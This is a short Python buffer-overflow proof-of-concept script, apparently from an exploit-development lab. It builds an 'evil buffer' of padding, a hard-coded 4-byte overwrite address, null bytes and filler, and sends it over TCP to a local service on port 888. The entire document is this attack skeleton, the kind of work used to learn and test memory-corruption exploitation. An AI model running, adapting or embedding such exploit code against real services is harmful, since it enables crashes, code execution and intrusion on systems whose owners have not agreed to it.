#!/usr/bin/python 
import socket 
import sys 
from struct import pack


server = "127.0.0.1"
port = 888
size = 1116
content = b""
content += b"A" * (size-len(content)-8) 
content += b'\x78\x31\x03\x01' + b"\x00" * 4 + b"B" * 20

print("Sending evil buffer...") 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((server, port)) 
s.send(content) 
s.close() 

print("Done!") 
   
